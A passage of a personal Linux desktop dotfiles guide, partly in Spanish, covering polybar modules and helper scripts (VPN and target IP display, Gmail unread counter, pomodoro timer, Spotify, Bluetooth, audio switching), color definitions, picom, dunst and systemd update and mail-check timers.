label = ${env:MAIN_DATETIME_LABEL}
label-padding = 3pt

[module/gmail]
type = custom/ipc
hook-0 = cat /home/melvin/.config/systemd/gmail_count
initial = 1
format-padding = 3pt
format = <output>
click-left = "output=$(cat $HOME/.config/systemd/gmail_count); if [[ ! $output =~ (0|Off|Error)$ ]]; then firefox https://mail.google.com > /dev/null 2>&1 & disown; fi"

[module/vpn]
type = custom/script
exec = $HOME/.config/polybar/scripts/vpn.sh
click-left = echo -n "$(ip a show tun0 | grep -oP '(?<=inet\s)\d+\.\d+\.\d+\.\d+')" | xclip -sel clip
interval = 2
label-padding = 3pt
label-foreground = ${colors.primary}

[module/target]
type = custom/script
exec = $HOME/.config/polybar/scripts/target.sh
click-left = echo -n "$(cat $HOME/.config/polybar/scripts/target.txt)" | xclip -sel clip
interval = 2
label-padding = 3pt
label-foreground = ${colors.danger}

[module/desk]
type = internal/xworkspaces
label-empty-foreground = ${colors.secondary}
label-active-foreground = ${colors.success}
label-occupied-foreground = ${colors.warning}

[module/pomodoro]
type = custom/ipc
hook-0 = $HOME/.config/polybar/scripts/pom.sh
initial = 1
label-padding = 3pt
click-left = $HOME/.config/polybar/scripts/pom.sh --toggle-start-pause
click-right = $HOME/.config/polybar/scripts/pom.sh --stop
click-middle = $HOME/.config/polybar/scripts/pom.sh --toggle-sound

[module/spotify]
type = custom/script
exec = $HOME/.config/polybar/scripts/spotify.sh
interval = 1
click-left = if ! playerctl --player=spotify status &>/dev/null; then /usr/bin/spotify > /dev/null 2>&1 & disown; else playerctl --player=spotify play-pause; fi
click-right = playerctl --player=spotify next
click-middle = playerctl --player=spotify previous
label-padding = 3pt

[module/bluetooth]
type = custom/ipc
hook-0 = $HOME/.config/polybar/scripts/bluetooth.sh --display
initial = 1
format = <output>
click-left = bluetoothctl power $(bluetoothctl show | grep -q "Powered: yes" && echo "off" || echo "on") && polybar-msg action "#bluetooth.hook.0"

[module/audio]
type = internal/pulseaudio
interval = 1
format-volume = <label-volume>
label-volume = ${env:MAIN_AUDIO_LABEL}
format-muted = <label-muted>
label-muted = ${env:MAIN_MUTED_LABEL}
click-right = $HOME/.config/polybar/scripts/audio-switch.sh

[module/dog]
type = custom/text
label = ${env:MAIN_DOG_LABEL}

[module/fire]
type = custom/text
label = ${env:MAIN_FIRE_LABEL}
click-left = /usr/bin/firefox

[module/burp]
type = custom/text
label = ${env:MAIN_BURP_LABEL}
click-left = /usr/bin/burpsuite

[module/wire]
type = custom/text
label = ${env:MAIN_WIRE_LABEL}
click-left = /usr/bin/wireshark

[module/tor]
type = custom/text
label = ${env:MAIN_TOR_LABEL}
click-left = /usr/bin/torbrowser-launcher

[module/vsc]
type = custom/text
label = ${env:MAIN_VSC_LABEL}
click-left = /usr/bin/code

[module/discord]
type = custom/text
label = ${env:MAIN_DISCORD_LABEL}
click-left = /usr/bin/discord

[module/obsidian]
type = custom/text
label = ${env:MAIN_OBSIDIAN_LABEL}
click-left = /usr/bin/obsidian

[module/kitty]
type = custom/text
label = ${env:MAIN_KITTY_LABEL}
click-left = bash -c 'umask 022; exec /usr/bin/kitty'
```

### env.sh

```bash
source $HOME/.config/colors/colors.sh

export MAIN_DOG_LABEL="[%{T3}%{F$COLOR_DOG}󰩃%{F-}%{T-}]"
export MAIN_BURP_LABEL="(%{T1}%{F$COLOR_ORANGE}%{O3}B%{O3}%{F-}%{T-})"
export MAIN_FIRE_LABEL="(%{F$COLOR_DANGER}%{O3}F%{O3}%{F-})"
export MAIN_WIRE_LABEL="(%{F$COLOR_PRIMARY}%{O3}W%{O3}%{F-})"
export MAIN_TOR_LABEL="(%{F$COLOR_PURPLE}%{O3}T%{O3}%{F-})"
export MAIN_VSC_LABEL="(%{F$COLOR_PRIMARY}%{O3}V%{O3}%{F-})"
export MAIN_DISCORD_LABEL="(%{F$COLOR_DISCORD}%{O3}D%{O3}%{F-})"
export MAIN_OBSIDIAN_LABEL="(%{F$COLOR_OBSIDIAN}%{O3}O%{O3}%{F-})"
export MAIN_KITTY_LABEL="(%{F$COLOR_SUCCESS}%{O3}K%{O3}%{F-})"
export MAIN_AURIS_LABEL="[%{T3}%{F$COLOR_WARNING}󰋋%{F-}%{T-}%{O5}%{F$COLOR_ORANGE}%percentage%%{F-}]"
export MAIN_SPEAKERS_LABEL="[%{T3}%{F$COLOR_WARNING}󰕾%{F-}%{T-}%{O5}%{F$COLOR_ORANGE}%percentage%%{F-}]"
export MAIN_BLUETOOTH_LABEL="[%{T3}%{F$COLOR_WARNING}󰂯%{F-}%{T-}%{O5}%{F$COLOR_ORANGE}%percentage%%{F-}]"
export MAIN_MUTED_LABEL="[%{T3}%{F$COLOR_DANGER}󰝟%{F-}%{T-}]"
export MAIN_DATETIME_LABEL="%{F$COLOR_PINK}%date%%{F-} %{F$COLOR_SECONDARY}%{F-} %{F$COLOR_PINK}%time%%{F-}"
export MAIN_AUDIO_LABEL=$MAIN_SPEAKERS_LABEL
```

### updates.sh

```bash
#!/usr/bin/env bash

source "$HOME/.config/colors/colors.sh"
UPDATE_FILE="$HOME/.config/systemd/updates_count"

display_updates() {
    if [ ! -f "$UPDATE_FILE" ]; then
        echo "0 0" > "$UPDATE_FILE"
    fi

    read -r pacman_count aur_count < "$UPDATE_FILE"

    if [ "${pacman_count:-0}" -gt 0 ]; then
        out_pacman="%{T2}%{F$COLOR_SUCCESS}$pacman_count%{F-}%{T-}"
    else
        out_pacman=""
    fi

    if [ "${aur_count:-0}" -gt 0 ]; then
        out_aur="%{T2}%{F$COLOR_SUCCESS}$aur_count%{F-}%{T-}"
    else
        out_aur=""
    fi

    echo "${out_pacman}%{O2}[%{T3}%{F$COLOR_PRIMARY}󰣇%{F-}%{T-}]%{O2}${out_aur}"
}

if [ ! -f "$UPDATE_FILE" ]; then
    echo "0 0" > "$UPDATE_FILE"
fi

read -r pacman_count aur_count < "$UPDATE_FILE"

case "$1" in
    pacman)
        if [ "${pacman_count:-0}" -gt 0 ]; then
          kitty -- bash -c "echo -e '\e[1;34mOfficial Repositories\e[0m\n'; checkupdates; echo; sudo pacman -Syu && echo \"0 \$(cut -d' ' -f2 $UPDATE_FILE)\" > $UPDATE_FILE" &
        fi
        ;;
    aur)
        if [ "${aur_count:-0}" -gt 0 ]; then
          kitty -- bash -c "echo -e '\e[1;34mAUR Packages\e[0m\n'; paru -Qua; paru -Sua && echo \"\$(cut -d' ' -f1 $UPDATE_FILE) 0\" > $UPDATE_FILE" &
        fi
        ;;
    *)
        display_updates
        ;;
esac
```

### audio-switch.sh

```bash
#!/usr/bin/env bash

ENV_FILE="$HOME/.config/polybar/env.sh"

CURRENT=$(wpctl status | awk '/Sinks:/ { in_sinks=1; next } /Sources:/ { in_sinks=0 } in_sinks && /\*/ { for(i=1;i<=NF;i++) if($i=="*") { print $(i+1); break } }' | tr -d '.')

SINKS=($(wpctl status | awk '/Sinks:/ { in_sinks=1; next } /Sources:/ { in_sinks=0 } in_sinks && /[0-9]+\./ && !/HDMI/ { for(i=1;i<=NF;i++) if($i ~ /^[0-9]+\.$/) { print $i; break } }' | tr -d '.'))

for i in "${!SINKS[@]}"; do
    if [[ "${SINKS[$i]}" == "$CURRENT" ]]; then
        NEXT=$(( (i + 1) % ${#SINKS[@]} ))
        wpctl set-default "${SINKS[$NEXT]}"
        break
    fi
done

sleep 0.2

ACTIVE_SINK=$(wpctl status | awk '/Sinks:/ { in_sinks=1; next } /Sources:/ { in_sinks=0 } in_sinks && /\*/')

if echo "$ACTIVE_SINK" | grep -qi "Hammerhead"; then
    sed -i 's|export MAIN_AUDIO_LABEL=.*|export MAIN_AUDIO_LABEL=$MAIN_BLUETOOTH_LABEL|' "$ENV_FILE"

elif echo "$ACTIVE_SINK" | grep -qi "Razer Base"; then
    sed -i 's|export MAIN_AUDIO_LABEL=.*|export MAIN_AUDIO_LABEL=$MAIN_AURIS_LABEL|' "$ENV_FILE"

else
    sed -i 's|export MAIN_AUDIO_LABEL=.*|export MAIN_AUDIO_LABEL=$MAIN_SPEAKERS_LABEL|' "$ENV_FILE"
fi

source $ENV_FILE

$HOME/.config/polybar/launch.sh &
```

### target.sh

```bash
#!/bin/bash

ip_address=$(/bin/cat $HOME/.config/polybar/scripts/target.txt)

if [ -n "$ip_address" ]; then
  echo "$ip_address"
else
  echo ""
fi
```

### vpn.sh

```bash
#!/bin/sh

IFACE=$(ip -o link show | awk -F': ' '/tun0/ {print $2}')

if [ "$IFACE" = "tun0" ]; then
  echo "$(ip a show tun0 | grep -oP '(?<=inet\s)\d+\.\d+\.\d+\.\d+')"
else
  echo ""
fi
```

### gmail.py

Activar la verificación en 2 pasos en la cuenta de Google.

En la cuenta de Google buscar `Contraseñas de aplicaciones` y en `Nombre de la app` crear un nombre para identificar el script. En la variable `PASSWORD` copiar la `contraseña de la aplicación generada` con el siguiente formato `cuca iksn tyzb gabf`.

Agregar email a la variable `EMAIL`.

```python
import imaplib
import socket
import os
import subprocess
import sys

sys.path.append(os.path.expanduser("~/.config/colors"))

from colors import ORANGE, SECONDARY, SUCCESS, DANGER

EMAIL = ""
PASSWORD = ""
ICON = f"%{{F{ORANGE}}}󰊫%{{F-}}"

OUTPUT_FILE = os.path.expanduser("~/.config/systemd/gmail_count")

def write_status(message):
    with open(OUTPUT_FILE, "w") as f:
        f.write(message)
    subprocess.run(["polybar-msg", "action", "#gmail.hook.0"], check=False)

try:
    M = imaplib.IMAP4_SSL("imap.gmail.com", 993, timeout=5)
    M.login(EMAIL, PASSWORD)

    status, select_data = M.select("INBOX", readonly=True)

    if status == 'OK':
        status, search_data = M.search(None, 'UNSEEN')

        if status == 'OK':
            ids_bytes = search_data[0]
            if ids_bytes:
                count = len(ids_bytes.split())
                write_status(f"{ICON} %{{F{SUCCESS}}}{count}%{{F-}}")
            else:
                write_status(f"{ICON} %{{F{SECONDARY}}}0%{{F-}}")
        else:
            write_status(f"{ICON} %{{F{DANGER}}}%{{F-}}")
    else:
        write_status(f"{ICON} %{{F{DANGER}}}%{{F-}}")

    M.close()
    M.logout()

except (imaplib.IMAP4.error, socket.timeout, Exception):
    write_status(f"{ICON} %{{F{SECONDARY}}}%{{F-}}")
```

### gmail-display.sh

```python
#!/usr/bin/env bash

GMAIL_FILE="$HOME/.config/systemd/gmail_count"

if [ ! -f "$GMAIL_FILE" ]; then
    echo "󰊫 0"
else
    cat "$GMAIL_FILE"
fi
```

### pom.sh

```bash
#!/usr/bin/env bash

source "$HOME/.config/colors/colors.sh"

STATE_FILE="/tmp/pomodoro_state"
TIMER_FILE="/tmp/pomodoro_timer"
SOUND_FILE="/tmp/pomodoro_sound"

WORK_MINUTES=50
REST_MINUTES=10
SOUND_PATH="/usr/share/sounds/freedesktop/stereo/complete.oga"

init_files() {
    [[ ! -f "$STATE_FILE" ]] && echo "Stopped" > "$STATE_FILE"
    [[ ! -f "$TIMER_FILE" ]] && echo "0" > "$TIMER_FILE"
    [[ ! -f "$SOUND_FILE" ]] && echo "on" > "$SOUND_FILE"
}

notify() {
    notify-send -u "$3" -a "Pomodoro" "$1" "$2"
    if [[ $(cat "$SOUND_FILE") == "on" && -f "$SOUND_PATH" ]]; then
        pw-play "$SOUND_PATH" &
    fi
}

trigger_update() {
    polybar-msg action "#pomodoro.hook.0" &>/dev/null
}

loop() {
    while true; do
        local state=$(cat "$STATE_FILE" 2>/dev/null)
        local duration=$(cat "$TIMER_FILE" 2>/dev/null)
        if [[ "$state" == "Stopped" ]]; then break; fi
        if [[ "$state" == "Work" || "$state" == "Rest" ]]; then
            if [[ "$duration" -gt 0 ]]; then
                duration=$((duration - 1))
                echo "$duration" > "$TIMER_FILE"
            else
                if [[ "$state" == "Work" ]]; then
                    echo "Rest" > "$STATE_FILE"
                    echo "$((REST_MINUTES * 60))" > "$TIMER_FILE"
                    notify "Break Time!" "Rest for $REST_MINUTES minutes." "critical"
                else
                    echo "Stopped" > "$STATE_FILE"
                    echo "0" > "$TIMER_FILE"
                    notify "Session Finished" "The series has ended." "normal"
                    trigger_update
                    break
                fi
            fi
        fi
        trigger_update
        sleep 1
    done
}

display() {
    init_files
    local state=$(cat "$STATE_FILE")
    local duration=$(cat "$TIMER_FILE")
    local sound=$(cat "$SOUND_FILE")
    local s_ico="%{F$COLOR_SUCCESS}󰓃%{F-}"; [[ "$sound" == "off" ]] && s_ico="%{F$COLOR_SECONDARY}󰓄%{F-}"
    local min=$((duration / 60))
    local sec=$((duration % 60))
    local time_str="%{F$COLOR_SECONDARY}$(printf "%02d" $min)%{F$COLOR_LIGHT}:%{F$COLOR_SECONDARY}$(printf "%02d" $sec)%{F-}"

    case "$state" in
        "Stopped") echo -e "%{F$COLOR_DANGER}󱎫%{F-} $s_ico" ;;
        "Paused")  echo -e "%{F$COLOR_WARNING}󰏤%{F-} $s_ico $time_str" ;;
        "Work")    echo -e "%{F$COLOR_PINK}󰔟%{F-} $s_ico $time_str" ;;
        "Rest")    echo -e "%{F$COLOR_SUCCESS}󱓞%{F-} $s_ico $time_str" ;;
    esac
}

case "$1" in
    --toggle-start-pause)
        init_files
        state=$(cat "$STATE_FILE")
        if [[ "$state" == "Stopped" ]]; then
            echo "Work" > "$STATE_FILE"
            echo "$((WORK_MINUTES * 60))" > "$TIMER_FILE"
            $0 --loop-internal &>/dev/null &
        elif [[ "$state" == "Work" || "$state" == "Rest" ]]; then
            echo "$state" > /tmp/pomodoro_old_state
            echo "Paused" > "$STATE_FILE"
        elif [[ "$state" == "Paused" ]]; then
            echo "$(cat /tmp/pomodoro_old_state)" > "$STATE_FILE"
            $0 --loop-internal &>/dev/null &
        fi
        trigger_update
        ;;
    --loop-internal) loop ;;
    --stop)
        echo "Stopped" > "$STATE_FILE"
        echo "0" > "$TIMER_FILE"
        pkill -f "pom.sh --loop-internal"
        trigger_update
        ;;
    --toggle-sound)
        if [[ $(cat "$SOUND_FILE") == "on" ]]; then echo "off" > "$SOUND_FILE"; else echo "on" > "$SOUND_FILE"; fi
        trigger_update
        ;;
    *) display ;;
esac
```

### spotify.sh

`$HOME/.config/polybar/scripts/spotify.sh`

```bash
#!/usr/bin/env bash

source "$HOME/.config/colors/colors.sh"

PLAYER="--player=spotify"

if ! playerctl $PLAYER status &>/dev/null; then
    echo "%{F$COLOR_SECONDARY}󰓇%{O3}%{F-} %{F$COLOR_SECONDARY}󰐊 Play%{F-}"
    exit 0
fi

STATUS=$(playerctl $PLAYER status)
ARTIST=$(playerctl $PLAYER metadata artist)
TITLE=$(playerctl $PLAYER metadata title)

MAX_LENGTH=25
COMBINED="$ARTIST %{T2}%{T-} $TITLE"
if [ ${#COMBINED} -gt $MAX_LENGTH ]; then
    COMBINED="${COMBINED:0:$MAX_LENGTH}..."
fi

if [ "$STATUS" = "Playing" ]; then
    echo "%{F$COLOR_SUCCESS}󰓇%{O3}%{F-} %{F$COLOR_LIGHT}󰏤%{F-} %{F$COLOR_PINK}$COMBINED%{F-}"
else
    echo "%{F$COLOR_SECONDARY}󰓇%{O3}%{F-} %{F$COLOR_SECONDARY}󰐊%{F-} %{F$COLOR_SECONDARY}$COMBINED%{F-}"
fi
```

### bluetooth.sh

```bash
#!/usr/bin/env bash

source "$HOME/.config/colors/colors.sh"

STATUS=$(bluetoothctl show | grep "Powered: yes" | wc -l)
CONNECTED=$(bluetoothctl info | grep "Connected: yes" | wc -l)

COLOR_OFF="$COLOR_SECONDARY"
COLOR_ON="$COLOR_INFO"
COLOR_CONNECTED="$COLOR_SUCCESS"

if [[ "$STATUS" -eq 0 ]]; then
    echo "[%{O2}%{F$COLOR_OFF}󰂲%{F-}%{O2}]"
elif [[ "$CONNECTED" -gt 0 ]]; then
    echo "[%{O2}%{F$COLOR_CONNECTED}󰂯%{F-}%{O2}]"
else
    echo "[%{O2}%{F$COLOR_ON}󰂯%{F-}%{O2}]"
fi
```

### /etc/udev/rules.d/99-bluetooth.rules

```bash
ACTION=="change", SUBSYSTEM=="bluetooth", RUN+="/usr/bin/polybar-msg action '#bluetooth.hook.0'"
```

## plank

### launch.sh

```bash
#!/bin/bash

killall -q plank
/usr/bin/plank &
```

## colors

### colors.ini

```bash
[colors]
primary   = #3B71CA
secondary = #9FA6B2
success   = #14A44D
danger    = #DC4C64
warning   = #E4A11B
info      = #54B4D3
light     = #FBFBFB
dark      = #332D2D
pink      = #C2527A
purple    = #7952B3
dog       = #C68642
orange    = #E8703A
obsidian  = #7C3AED
discord   = #5865F2
```

### colors.py

```bash
PRIMARY   = "#3B71CA"
SECONDARY = "#9FA6B2"
SUCCESS   = "#14A44D"
DANGER    = "#DC4C64"
WARNING   = "#E4A11B"
INFO      = "#54B4D3"
LIGHT     = "#FBFBFB"
DARK      = "#332D2D"
PINK      = "#C2527A"
PURPLE    = "#7952B3"
DOG       = "#C68642"
ORANGE    = "#E8703A"
OBSIDIAN  = "#7C3AED"
DISCORD   = "#5865F2"
```

### colors.sh

```bash
COLOR_PRIMARY="#3B71CA"
COLOR_SECONDARY="#9FA6B2"
COLOR_SUCCESS="#14A44D"
COLOR_DANGER="#DC4C64"
COLOR_WARNING="#E4A11B"
COLOR_INFO="#54B4D3"
COLOR_LIGHT="#FBFBFB"
COLOR_DARK="#332D2D"
COLOR_PINK="#C2527A"
COLOR_PURPLE="#7952B3"
COLOR_DOG="#C68642"
COLOR_ORANGE="#E8703A"
COLOR_OBSIDIAN="#7C3AED"
COLOR_DISCORD="#5865F2"

COLOR_RESET="\033[0m"

# -- ANSI (truecolor para bash scripts) --
_hex() { local h="${1#"#"}"; echo "\e[38;2;$((16#${h:0:2}));$((16#${h:2:2}));$((16#${h:4:2}))m"; }

ANSI_PRIMARY=$(_hex "$COLOR_PRIMARY")
ANSI_SECONDARY=$(_hex "$COLOR_SECONDARY")
ANSI_SUCCESS=$(_hex "$COLOR_SUCCESS")
ANSI_DANGER=$(_hex "$COLOR_DANGER")
ANSI_WARNING=$(_hex "$COLOR_WARNING")
ANSI_INFO=$(_hex "$COLOR_INFO")
ANSI_LIGHT=$(_hex "$COLOR_LIGHT")
ANSI_DARK=$(_hex "$COLOR_DARK")
ANSI_PINK=$(_hex "$COLOR_PINK")
ANSI_PURPLE=$(_hex "$COLOR_PURPLE")
ANSI_DOG=$(_hex "$COLOR_DOG")
ANSI_ORANGE=$(_hex "$COLOR_ORANGE")
ANSI_OBSIDIAN=$(_hex "$COLOR_OBSIDIAN")
ANSI_DISCORD=$(_hex "$COLOR_DISCORD")
```

## picom

### picom.conf

```bash
backend = "glx";
vsync = true;
shadow = false;
fading = false;

rules: ({
  match = "class_g = 'kitty'";
  opacity = 0.90;
}, {
  match = "class_g = 'firefox'";
  opacity = 0.9;
}, {
  match = "class_g = 'Code'";
  opacity = 0.9;
}, {
  match = "class_g = 'discord'";
  opacity = 0.9;
}, {
  match = "class_g = 'obsidian'";
  opacity = 0.9;
}, {
  match = "class_g = 'burp-StartBurp'";
  opacity = 0.9;
}, {
  match = "class_g = 'Wireshark'";
  opacity = 0.9;
}, {
  match = "class_g = 'Plank'";
  opacity = 0.9;
}, {
  match = "class_g = 'Xdg-desktop-portal-gtk'";
  opacity = 0.9;
}, {
  match = "class_g = 'steam'";
  opacity = 0.9;
}, {
  match = "class_g = 'Stremio'";
  opacity = 0.9;
}, {
  match = "class_g = 'Kdenlive'";
  opacity = 0.9;
}, {
  match = "class_g = 'Gimp'";
  opacity = 0.9;
}, {
  match = "class_g = 'Spotify'";
  opacity = 0.9;
}, {
  match = "class_g = 'Flameshot'";
  opacity = 0.9;
})
```

## dunst

### dunstrc

```bash
[global]
    monitor = 0
    width = 300
    height = (110, 110)
    notification_limit = 10
    origin = bottom-right
    offset = (20, 20)
    transparency = 25
    padding = 12
    horizontal_padding = 12
    gap_size = 5
    font = "DejaVuSans 11"
    line_height = 4
    icon_theme = "Papirus-Dark, breeze-dark"
    history_length = 100
    mouse_left_click = do_action, close_current
    mouse_middle_click = close_current
    mouse_right_click = close_current
    ignore_dbusclose = true
    frame_width = 0
    background = "#1E1E2E"
    foreground = "#CDD6F4"
    timeout = 0
```

### launch.sh

```bash
#!/bin/bash

killall -q dunst
pgrep -x dunst > /dev/null || /usr/bin/dunst &
```

## Systend

### $HOME/.config/systemd/user/check-updates.service

```bash
[Unit]
Description=Polybar update checker
After=network-online.target

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'pacman_count=$(checkupdates 2>/dev/null | wc -l); aur_count=$(paru -Qua 2>/dev/null | wc -l); echo "$pacman_count $aur_count" > $HOME/.config/systemd/updates_count'
```

### $HOME/.config/systemd/user/check-updates.timer

```bash
[Unit]
Description=Run update checker every 30 minutes

[Timer]
OnCalendar=*:0/30
Persistent=true

[Install]
WantedBy=timers.target
```

### $HOME/.config/systemd/user/check-gmail.service

```bash
[Unit]
Description=Polybar Gmail inbox checker
After=network-online.target

[Service]
Type=oneshot
ExecStart=/usr/bin/python3 %h/.config/polybar/scripts/gmail.py
```

### $HOME/.config/systemd/user/check-gmail.timer

```bash
[Unit]
Description=Run Gmail inbox checker every minute

[Timer]
OnCalendar=*:0/1
Persistent=true
Unit=check-gmail.service

[Install]
WantedBy=timers.target
```
